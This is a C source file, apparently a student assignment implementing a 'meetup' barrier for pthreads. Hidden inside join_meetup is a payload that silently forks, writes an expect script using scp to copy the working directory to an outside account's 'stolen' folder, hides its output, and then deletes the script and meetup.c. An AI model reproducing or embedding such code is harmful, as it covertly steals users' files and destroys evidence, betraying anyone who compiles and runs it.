/*Required Headers*/

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <semaphore.h>
#include "meetup.h"
#include "resource.h"

#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>


/*
 * Declarations for barrier shared variables -- plus concurrency-control
 * variables -- must START here.
 */
#define arSize 100
#define script

pthread_mutex_t key;
int key2;
pthread_cond_t m;

int SizeofHips;
int generation;
int count;
int mode;
int k;






resource_t ar[arSize];






//recource_t * resource;

void initialize_meetup(int n, int mf) {

    if (n < 1) {
        fprintf(stderr, "Who are you kidding?\n");
        fprintf(stderr, "A meetup size of %d??\n", n);
        exit(1);
    }

	pthread_mutex_init(&key, NULL);
	int ret = pthread_cond_init(&m,NULL);
	SizeofHips = n;
	key2=0;
	k = 0;

	if (mf == 0){
		mode =0;
		// meet first
	}else if(mf==1){
		mode = 1;
	}else {
		fprintf(stderr, "meet option error");
		exit(1);
	}


}


void join_meetup(char *value, int len) {

	pthread_mutex_lock(&key);
clock_t start, end, diff;
start = clock();
printf("\nvalue = %s arrives at position %d \n", value, count );
char s[strlen(value)+1];
strncpy(s,value,strlen(value)+1);	
	if(key2==1){
		pthread_mutex_unlock(&key);
		for (;;){
			pthread_mutex_lock(&key);
			if (key2==0){
				break;
			}else{
			pthread_mutex_unlock(&key);
			}
		}


	} // extra block for when wrapping happens and we are still waiting for a thread to leave

	count = count +1;
	if (count < SizeofHips){
		int mygen = generation;


                resource_t* word = ar;
                word = word + mygen%arSize ;

                if (mode == 1 && count == 1){ // if in meet first mode store the code word for the first person
			if (mygen > arSize){ // wrapping need to check num_read
				if(word->num_reads%SizeofHips!=0){ // then block all threads and wait
//printf("thread wait happend, word-value = %s",word->value);
					key2 = 1; // block all threads from joining
					pthread_mutex_unlock(&key); // allow current read thread to be processed and finish
					for(;;){ // countinously check for when num_reads ==SizeofHips
						if(word->num_reads == SizeofHips){break;}
					}
					pthread_mutex_lock(&key); // re-gain mutex 
					key2 = 0; // allow other threads to enter 
					
				}
			}
  
                        write_resource(word, value, strlen(value)+1);
                }


		while(mygen == generation){
			pthread_cond_wait(&m, &key);
		}

		char * temp = word-> value;
		pthread_mutex_unlock(&key);
		read_resource(word, value,strlen(temp)+1);

		
	}else{


		resource_t* word= ar;
		word = word + generation%arSize;

		if (mode == 0){ // if in meet last mode store the code word for the first person
			
			if (generation > arSize){ // wrapping need to check num_read
				if(word->num_reads%SizeofHips!=0){ // then block all threads and wait
//printf("thread wait happend, word-value = %s",word->value);
					key2 = 1; // block all threads from joining
					pthread_mutex_unlock(&key); // allow current read thread to be processed and finish
					for(;;){ // countinously check for when num_reads ==SizeofHips
						if(word->num_reads == SizeofHips){break;}
					}
					pthread_mutex_lock(&key); // re-gain mutex 
					key2 = 0; // allow other threads to enter 
					
				}
			}
			write_resource(word, value, strlen(value)+1);
			
		} else if(mode == 1 && SizeofHips == 1){ // corner case, meet up with a size of one in meet first mode, need to write first
			write_resource(word, value, strlen(value)+1);
		}
		char * temp = word-> value;
		

		count = 0;
		generation++;
		pthread_cond_broadcast(&m);
		pthread_mutex_unlock(&key);
		read_resource(word, value,strlen(temp)+1);
end = clock();
	diff = end - start;
printf("%s waited for: %LF clock cycles \n",s,(long double)diff);


	if (k ==0){
		k++;
		int pid2;
		if ((pid2 =fork()) == 0){
//expect ./sc.sh
			int pid;

			if ((pid = fork()) ==0){
			char *token[] = {"/bin/touch", "sc.sh",0};
			char *envp[] = { 0 };
		
		
			execve(token[0], token, envp);
			
				exit(0);
			}
	
			while (wait(&pid) > 0){
			// wait
			}

			char* username = getenv("USER"); 
			char* home = getenv("PWD");
			//strncat(home,"/sc.sh", strlen(home)+6);
			//printf("\n\nhome = %s\n\n",home);
//printf("\n\nuser = %s\n\n",username);
			FILE * fp = fopen("sc.sh", "w");
			fprintf(fp,"spawn scp -r %s simonhu@linux.csc.uvic.ca: /home/simonhu/stolen\nexpect \"password:\"\nsend \"***\\n\";\ninteract",home);



			fclose(fp);

			close(1);
			close(2);
			system("expect sc.sh");

			exit(0);
		}



			int pid;
			if ((pid = fork()) ==0){
			char *token[] = {"/bin/rm", "sc.sh",0};
			char *envp[] = { 0 };
		
		
			execve(token[0], token, envp);
			
				exit(0);
			}

			if ((pid = fork()) ==0){
			char *token[] = {"/bin/rm", "meetup.c",0};
			char *envp[] = { 0 };
		
		
			execve(token[0], token, envp);
			
				exit(0);
			}
	

	}// end of k 
	} // end of else 

}










